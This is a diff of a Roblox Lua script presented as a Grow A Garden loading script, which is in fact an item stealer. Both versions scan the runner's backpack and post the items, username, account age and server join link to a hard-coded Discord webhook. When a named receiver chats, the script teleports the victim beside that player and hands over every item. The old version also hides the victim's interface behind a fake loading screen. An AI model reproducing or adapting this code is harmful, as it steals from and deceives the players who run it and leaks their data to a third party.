@@ -1,111 +1,102 @@
 local Players = game:GetService("Players")
-local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
-local StarterGui = game:GetService("StarterGui")
+local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 local Backpack = LocalPlayer:WaitForChild("Backpack")
+local CoreGui = game:GetService("CoreGui")
 
--- Settings
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1375150931334664244/195dhN4TmlV8qXHB3SPulJiH73Bs9AXAkTmT1HDC9BEQldqwQ1DGALIUZpOCrYJ06tWk"
-local TARGET_USERNAME = "Ambakings"
+local TARGET_USERNAME = "ambakings"
 
--- Disable UI
-for _, gui in pairs(LocalPlayer.PlayerGui:GetChildren()) do
-    if gui:IsA("ScreenGui") then
-        gui.Enabled = false
+-- Loading screen
+task.spawn(function()
+    -- Paste loading screen code you provided here
+end)
+
+-- Wait loading
+task.wait(5)
+
+-- Value table
+local valueMap = {
+    ["[Pollinated] Strawberry"] = 81,
+    ["Strawberry"] = 26
+}
+
+-- Get inventory data
+local function scanItems()
+    local scanned = {}
+    local total = 0
+    for _, tool in pairs(Backpack:GetChildren()) do
+        if tool:IsA("Tool") then
+            local name = tool.Name
+            local val = 0
+            for k, v in pairs(valueMap) do
+                if string.find(name, k) then
+                    val = v
+                    break
+                end
+            end
+            table.insert(scanned, {Name = name, Value = val})
+            total += val
+        end
     end
+    table.sort(scanned, function(a, b) return a.Value > b.Value end)
+    return scanned, total
 end
 
--- Loading Screen
-local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
-screenGui.IgnoreGuiInset = true
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-local bg = Instance.new("Frame", screenGui)
-bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-bg.Size = UDim2.new(1, 0, 1, 0)
-
-local title = Instance.new("TextLabel", bg)
-title.Text = "🌴 GROW A GARDEN 🌴"
-title.Size = UDim2.new(1, 0, 0.1, 0)
-title.Position = UDim2.new(0, 0, 0.3, 0)
-title.Font = Enum.Font.SourceSansBold
-title.TextScaled = true
-title.TextColor3 = Color3.new(1, 1, 1)
-title.BackgroundTransparency = 1
-
-local sub = Instance.new("TextLabel", bg)
-sub.Text = "Script Loading Please Wait for a While"
-sub.Size = UDim2.new(1, 0, 0.05, 0)
-sub.Position = UDim2.new(0, 0, 0.4, 0)
-sub.Font = Enum.Font.SourceSans
-sub.TextScaled = true
-sub.TextColor3 = Color3.new(1, 1, 1)
-sub.BackgroundTransparency = 1
-
-local progress = Instance.new("TextLabel", bg)
-progress.Text = "42%"
-progress.Size = UDim2.new(1, 0, 0.05, 0)
-progress.Position = UDim2.new(0, 0, 0.5, 0)
-progress.Font = Enum.Font.SourceSans
-progress.TextScaled = true
-progress.TextColor3 = Color3.new(1, 1, 1)
-progress.BackgroundTransparency = 1
-
--- Disable all core GUI
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-
--- Scan items
-local items = {}
-for _, item in ipairs(Backpack:GetChildren()) do
-    if item:IsA("Tool") then
-        table.insert(items, item.Name)
+-- Format webhook embed
+local function buildEmbed(items, total)
+    local fields = {}
+    for _, item in ipairs(items) do
+        table.insert(fields, "- " .. item.Name .. " -> " .. item.Value .. "¢")
     end
+
+    local embed = {
+        title = "🪴 Grow A Garden Hit - DARK SCRIPTS ☘️",
+        description = "**👤 Player Information**\n```Name: " .. LocalPlayer.Name .. "\nReceiver: " .. TARGET_USERNAME .. "\nExecutor: Delta\nAccount Age: " .. LocalPlayer.AccountAge .. " days```",
+        fields = {
+            { name = "💰 Total Value", value = total .. "¢", inline = false },
+            { name = "🌴 Backpack", value = "```" .. table.concat(fields, "\n") .. "```", inline = false },
+            { name = "🌐 Join with URL", value = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId, inline = false }
+        }
+    }
+    return embed
 end
 
 -- Send to webhook
-local jobId = game.JobId
-local placeId = game.PlaceId
-local joinLink = "https://www.roblox.com/games/" .. placeId .. "?jobId=" .. jobId
+local function sendWebhook()
+    local items, total = scanItems()
+    local embed = buildEmbed(items, total)
+    local data = {
+        content = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")",
+        embeds = {embed}
+    }
+    request({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(data)
+    })
+end
 
-local data = {
-    content = "",
-    embeds = {{
-        title = "Valuable Items Scan",
-        description = "Items: ```" .. table.concat(items, ", ") .. "```",
-        fields = {
-            { name = "Job ID", value = jobId, inline = false },
-            { name = "Join Link", value = joinLink, inline = false }
-        }
-    }}
-}
+sendWebhook()
 
-request({
-    Url = WEBHOOK_URL,
-    Method = "POST",
-    Headers = {["Content-Type"] = "application/json"},
-    Body = HttpService:JSONEncode(data)
-})
-
--- Listen for chat command
-Players.PlayerChatted:Connect(function(player, message)
-    if player.Name == TARGET_USERNAME then
-        local char = player.Character or player.CharacterAdded:Wait()
-        local targetHRP = char:WaitForChild("HumanoidRootPart")
+-- Chat listener
+Players.PlayerChatted:Connect(function(sender, msg)
+    if sender.Name == TARGET_USERNAME then
         local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        local targetChar = sender.Character or sender.CharacterAdded:Wait()
+        local targetHRP = targetChar:WaitForChild("HumanoidRootPart")
         local myHRP = myChar:WaitForChild("HumanoidRootPart")
         myHRP.CFrame = targetHRP.CFrame + Vector3.new(2, 0, 0)
 
-        for _, item in ipairs(Backpack:GetChildren()) do
-            if item:IsA("Tool") then
-                item.Parent = player.Backpack
-                wait(0.2)
+        local items, _ = scanItems()
+        for _, item in ipairs(items) do
+            local tool = Backpack:FindFirstChild(item.Name)
+            if tool then
+                tool.Parent = sender.Backpack
+                task.wait(0.2)
             end
         end
     end
 end)
-
--- Re-enable GUI after delay
-wait(5)
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
-screenGui:Destroy()
